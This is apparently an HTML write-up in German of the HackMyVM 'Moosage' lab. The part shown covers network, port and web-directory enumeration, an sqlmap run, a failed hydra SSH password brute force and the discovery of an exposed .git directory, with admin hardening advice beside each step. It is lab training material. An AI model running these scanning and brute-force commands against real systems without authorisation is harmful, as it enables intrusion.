@@ -1,0 +1,1042 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moosage - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Moosage - HackMyVM - Hard - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte Rot sein für Hard) -->
+            <h2>Hard</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte Rot sein für Hard) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">dirsearch</div>
+                <div class="tool-item">git-dumper</div>
+                <div class="tool-item">pip</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:09:b6:08, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="command">192.168.2.1</span>	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+<span class="command">192.168.2.102</span>	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+<span class="command">192.168.2.104</span>	84:25:19:2f:66:32	Samsung Electronics Co.,Ltd
+<span class="command">192.168.2.110</span>	08:00:27:14:43:34	PCS Systemtechnik GmbH
+<span class="command">192.168.2.188</span>	f0:2f:74:1a:68:c0	(Unknown)
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.478 seconds (173.21 hosts/sec). 5 responded
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk nach aktiven Geräten zu durchsuchen, indem ARP-Anfragen gesendet werden. Er listet die IP-Adresse, MAC-Adresse und den Hersteller (OUI) für antwortende Geräte auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert mehrere Geräte im Netz. Der Host `192.168.2.110` mit der MAC-Adresse `08:00:27:14:43:34` (PCS Systemtechnik GmbH, was auf Oracle VirtualBox hindeutet) ist unser Zielsystem "Moosage". Die eigene IP des Scanners ist `192.168.2.140`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP `192.168.2.110` identifiziert. Der nächste Schritt ist ein detaillierter Port-Scan mit `nmap`, um offene Dienste zu finden. Es ist sinnvoll, den Hostnamen `moosage.hmv` der IP in `/etc/hosts` zuzuordnen.
+<br><strong>Empfehlung (Admin):</strong> ARP-Scans sind im lokalen Netz normal. Überwachungssysteme können auf übermäßige Scan-Aktivität achten. Netzwerksegmentierung kann die Reichweite solcher Scans einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Öffnet die lokale `/etc/hosts`-Datei im `vi`-Editor, um den Hostnamen `moosage.hmv` der Ziel-IP `192.168.2.110` zuzuordnen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um Tools wie Webbrowser oder `nikto` zu ermöglichen, den Hostnamen korrekt aufzulösen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie die Zeile `192.168.2.110 moosage.hmv` hinzu und speichern Sie die Datei.
+ <br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.110 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-02 22:53 CEST
+Nmap scan report for moosage.hmv (192.168.2.110)
+Host is up (0.00027s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 02:65:e6:05:af:c8:81:9c:30:b0:da:e3:1e:d8:be:02 (RSA)</span>
+|   <span class="command">256 3f:7d:4b:86:8d:c7:01:8f:b3:56:6d:65:c2:e5:cf:4e (ECDSA)</span>
+|_  <span class="command">256 8e:d4:b8:d6:8e:d9:61:a1:3e:7f:5e:d7:ec:dc:bb:de (ED25519)</span>
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+| http-methods:
+|_  Supported Methods: <span class="command">GET HEAD</span>
+|_http-server-header: <span class="command">nginx/1.14.2</span>
+|_http-title: <span class="command">Moosage - login</span>
+MAC Address: 08:00:27:14:43:34 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.27 ms moosage.hmv (192.168.2.110)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.03 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan des Ziels `192.168.2.110`.
+*   `-sS`: TCP SYN Scan.
+*   `-sC`: Standard-Skript-Scan.
+*   `-T5`: Aggressives Timing.
+*   `-sV`: Versionserkennung.
+*   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scan und Traceroute.
+*   `-p-`: Scannt alle TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet zwei offene Ports:
+*   **Port 22 (SSH):** Läuft OpenSSH 7.9p1 auf Debian 10. Diese Version ist relativ aktuell und weniger wahrscheinlich direkt ausnutzbar ohne Zugangsdaten.
+*   **Port 80 (HTTP):** Läuft ein Nginx Webserver Version 1.14.2. Der Titel der Seite ist "Moosage - login", was auf eine Webanwendung mit Authentifizierung hindeutet. Nur GET und HEAD Methoden sind erlaubt.
+Das Betriebssystem wird als Linux (Kernel 4.15 - 5.8) identifiziert, was zu Debian 10 passt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der primäre Fokus sollte auf dem HTTP-Dienst auf Port 80 liegen. Die Login-Seite muss genauer untersucht werden. Enumeration von Verzeichnissen und Dateien auf dem Webserver ist der nächste Schritt. SSH bleibt ein potenzieller Vektor, falls Zugangsdaten gefunden werden.
+<br><strong>Empfehlung (Admin):** Halten Sie alle Dienste (SSH, Nginx) aktuell. Konfigurieren Sie Nginx so, dass die genaue Version im `Server`-Header nicht preisgegeben wird (`server_tokens off;`). Implementieren Sie Sicherheitsheader für die Webanwendung.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.110/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110/
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/02 22:58:38 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.110/blog</span>                 (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/]
+<span class="command">http://192.168.2.110/index.php</span>            (Status: 200) [Size: 10091]
+===============================================================
+2022/10/02 23:01:19 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien im Web-Root (`/`) zu finden.
+*   `-u http://192.168.2.110/`: Ziel-URL.
+*   `-w ...`: Wortliste.
+*   `-x ...`: Liste von Dateierweiterungen (einschließlich vieler Mediendateien).
+*   `-t 100`: 100 Threads.
+*   `-e`: Erweitert die Ausgabe zur vollen URL.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `gobuster` findet ein Verzeichnis `/blog` (das auf `/blog/` umleitet) und die Datei `/index.php`. Die Hauptanwendung scheint sich unter `/blog` zu befinden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie `gobuster` erneut gezielt gegen das Verzeichnis `http://192.168.2.110/blog/` aus, um dessen Inhalt zu enumerieren. Untersuchen Sie die `index.php`.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass keine sensiblen Dateien oder Verzeichnisse direkt im Web-Root liegen. Konfigurieren Sie den Webserver so, dass Verzeichnisauflistungen deaktiviert sind.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.110/blog/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110/blog/
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/02 23:01:55 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.110/blog/index.php</span>            (Status: 200) [Size: 10091]
+<span class="command">http://192.168.2.110/blog/data</span>                 (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/data/]
+<span class="command">http://192.168.2.110/blog/common.php</span>           (Status: 200) [Size: 0]
+<span class="command">http://192.168.2.110/blog/static</span>               (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/static/]
+<span class="command">http://192.168.2.110/blog/ajax.php</span>             (Status: 200) [Size: 47]
+<span class="command">http://192.168.2.110/blog/app</span>                  (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/app/]
+<span class="command">http://192.168.2.110/blog/robots.txt</span>           (Status: 200) [Size: 25]
+<span class="command">http://192.168.2.110/blog/LICENSE</span>              (Status: 200) [Size: 35149]
+<span class="command">http://192.168.2.110/blog/app/db</span>                   (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/app/db/]
+<span class="command">http://192.168.2.110/blog/app/lang</span>                 (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/app/lang/]
+<span class="command">http://192.168.2.110/blog/static/images</span>               (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/static/images/]
+<span class="command">http://192.168.2.110/blog/static/scripts</span>              (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/static/scripts/]
+<span class="command">http://192.168.2.110/blog/static/styles</span>               (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/static/styles/]
+===============================================================
+2022/10/02 23:04:41 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Erneuter `gobuster`-Scan, diesmal gezielt auf das `/blog`-Verzeichnis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan enthüllt die Struktur der Blog-Anwendung:
+*   `/data`, `/static`, `/app`: Hauptverzeichnisse. `/data` und `/app` geben bei direktem Zugriff einen `403 Forbidden`-Fehler zurück, was gut ist, aber das Verzeichnis selbst existiert.
+*   `index.php`, `common.php`, `ajax.php`: PHP-Dateien der Anwendung. `common.php` ist leer (Größe 0), `ajax.php` gibt eine Fehlermeldung zurück ("Direct access violation"), was auf eine API oder einen AJAX-Endpunkt hindeutet. `index.php` ist die Hauptseite.
+*   `robots.txt`: Enthält `Disallow: /`, was Suchmaschinen anweist, nichts zu indizieren.
+*   `LICENSE`: Eine Lizenzdatei (GPL v3).
+*   Unterverzeichnisse wie `/app/db`, `/app/lang`, `/static/images`, `/static/scripts`, `/static/styles` werden ebenfalls gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die Verzeichnisstruktur gibt Hinweise auf die verwendete Technologie. `/app/db` ist interessant. Die `ajax.php` könnte auf Schwachstellen (SQLi, LFI) getestet werden. Führen Sie `gobuster` rekursiv auf die Unterverzeichnisse aus. Analysieren Sie den JS-Code.
+<br><strong>Empfehlung (Admin):** Zugriff auf `/data` und `/app` korrekt eingeschränkt (403). Verzeichnisauflistungen deaktivieren. `robots.txt` bietet keine Sicherheit. Endpunkte wie `ajax.php` absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://moosage.hmv</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.110
++ Target Hostname:    moosage.hmv
++ Target Port:        80
++ Start Time:         2022-10-02 23:09:17 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.14.2</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="password">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7785 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-10-02 23:09:27 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird gegen den Host `moosage.hmv` (Port 80) ausgeführt, um nach bekannten Webserver-Schwachstellen und Konfigurationsproblemen zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die Nginx-Version und meldet erneut die standardmäßigen fehlenden Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`). Es findet keine weiteren spezifischen Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Nikto ist hier wenig ergiebig. Fokus auf manuelle Enumeration der Blog-Anwendung.
+<br><strong>Empfehlung (Admin):** Fehlende HTTP-Sicherheitsheader implementieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://192.168.2.110/blog/index.php?FUZZ=id" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 --hh 10089</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.110/blog/index.php?FUZZ=id
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+Total time: 13.91645s
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: 15848.71
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` versucht, GET-Parameter für `index.php` zu finden, indem es Einträge aus der Wortliste als Parameternamen testet (`FUZZ=id`). Es filtert 404-Antworten und Antworten mit einer Größe von 10089 Zeichen (vermutlich die Standardgröße ohne gültigen Parameter).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine Parameter, die eine abweichende Antwort erzeugen. Einfaches Parameter-Fuzzing ist hier nicht erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Versuchen Sie andere Fuzzing-Strategien (POST-Parameter, JS-Analyse für API-Endpunkte/Parameter). Untersuchen Sie die Blog-Anwendung manuell mit einem Proxy.
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass die Anwendung unbekannte Parameter korrekt behandelt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.110/blog/static/images/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110/blog/static/images/
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/02 23:11:05 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.110/blog/static/images/profile.jpg</span>          (Status: 200) [Size: 1030]
+<span class="command">http://192.168.2.110/blog/static/images/star.png</span>             (Status: 200) [Size: 470]
+<span class="command">http://192.168.2.110/blog/static/images/next.png</span>             (Status: 200) [Size: 1350]
+<span class="command">http://192.168.2.110/blog/static/images/close.png</span>            (Status: 200) [Size: 280]
+<span class="command">http://192.168.2.110/blog/static/images/prev.png</span>             (Status: 200) [Size: 1360]
+<span class="command">http://192.168.2.110/blog/static/images/trophy.png</span>           (Status: 200) [Size: 489]
+===============================================================
+2022/10/02 23:13:47 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Dateien im Verzeichnis `/blog/static/images/` zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es werden mehrere Bilddateien (`.jpg`, `.png`) gefunden, die wahrscheinlich zum Design gehören.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Unwahrscheinlich relevant. Fortsetzung der Enumeration anderer Verzeichnisse.
+ <br><strong>Empfehlung (Admin):** Keine spezifischen Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.110/blog/static/scripts/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110/blog/static/scripts/
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/02 23:13:49 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.110/blog/static/scripts/app.js</span>               (Status: 200) [Size: 25882]
+<span class="command">http://192.168.2.110/blog/static/scripts/lightbox.js</span>          (Status: 200) [Size: 18089]
+===============================================================
+2022/10/02 23:16:30 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Dateien im Verzeichnis `/blog/static/scripts/` zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zwei JavaScript-Dateien (`app.js`, `lightbox.js`) werden gefunden. Diese enthalten clientseitigen Code und könnten Hinweise auf APIs oder Frontend-Schwachstellen geben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** JavaScript-Dateien herunterladen und analysieren (AJAX-Aufrufe, Parameter, Kommentare).
+ <br><strong>Empfehlung (Admin):** JavaScript minifizieren/obfuscaten. Kommentare entfernen. Serverseitige Validierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.110/blog/app/db" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110/blog/app/db
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/02 23:16:36 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.110/blog/app/db/mysql</span>                (Status: 301) [Size: 185] [--> http://192.168.2.110/blog/app/db/mysql/]
+===============================================================
+2022/10/02 23:19:17 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` scannt das Verzeichnis `/blog/app/db`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet ein Unterverzeichnis `mysql`. Dies verstärkt den Verdacht auf eine MySQL-Datenbank.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Direkter Zugriff nicht möglich. Suche nach Konfigurationsdateien im `/blog`-Verzeichnis oder dessen Unterverzeichnissen, die DB-Zugangsdaten enthalten könnten. Test auf SQLi.
+ <br><strong>Empfehlung (Admin):** Zugriff auf Verzeichnisse wie `/app` über das Web einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/mosag.reg --batch --dbs</span></div>
+                    <pre>[Keine Ausgabe im Originaltext vorhanden]</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird gestartet, um auf SQL-Injection zu testen, basierend auf einer gespeicherten Anfrage in `mosag.reg`. `--batch` für nicht-interaktiven Modus, `--dbs` zum Auflisten der Datenbanken bei Erfolg.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe fehlt im Text, daher ist das Ergebnis des SQL-Injection-Tests unbekannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ergebnis überprüfen (Logs, erneuter Lauf). Ggf. andere Anfragen oder Optionen testen.
+ <br><strong>Empfehlung (Admin):** Prepared Statements verwenden, Benutzereingaben validieren/bereinigen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l miroslav -P /usr/share/wordlists/rockyou.txt ssh://moosage.hmv:22 -t 32 -F</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-02 23:33:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344401 login tries (l:1/p:14344401), ~448263 tries per task
+[DATA] attacking ssh://moosage.hmv:22/
+<span class="password">[ERROR] target ssh://192.168.2.110:22/ does not support password authentication (method reply 4).</span>
+1 target did not support password authentication.
+Hydra finished at 2022-10-02 23:33:20
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, das SSH-Passwort für den Benutzer `miroslav` mittels `hydra` und `rockyou.txt` zu erraten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlschlag. Der SSH-Server akzeptiert keine Passwort-Authentifizierung, nur schlüsselbasierte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** SSH-Passwort-Brute-Force ist hier sinnlos. Fokus auf andere Vektoren (Webanwendung, Suche nach privaten Schlüsseln).
+<br><strong>Empfehlung (Admin):** Gut! `PasswordAuthentication no` in `sshd_config` beibehalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/source/.git]
+└─# <span class="command">dirsearch -u "http://192.168.2.110/blog/" -w /usr/share/dirb/wordlists/common.txt -e .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv</span></div>
+                    <pre>
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv | HTTP method: GET | Threads: 30 | Wordlist size: 4613
+
+Output File: /root/.dirsearch/reports/192.168.2.110/-blog-_22-10-02_23-57-57.txt
+
+Error Log: /root/.dirsearch/logs/errors-22-10-02_23-57-57.log
+
+Target: http://192.168.2.110/blog/
+
+[23:57:57] Starting:
+[23:57:57] <span class="command">200 -   23B  - /blog/.git/HEAD</span>
+[23:57:57] 200 -  300B  - /blog/.htaccess
+[23:57:58] 301 -  185B  - /blog/app  ->  http://192.168.2.110/blog/app/
+[23:57:59] 301 -  185B  - /blog/data  ->  http://192.168.2.110/blog/data/
+[23:58:00] 200 -    1KB - /blog/favicon.ico
+[23:58:02] 200 -   10KB - /blog/index.php
+[23:58:02] 200 -   34KB - /blog/LICENSE
+[23:58:06] 200 -   25B  - /blog/robots.txt
+[23:58:07] 301 -  185B  - /blog/static  ->  http://192.168.2.110/blog/static/
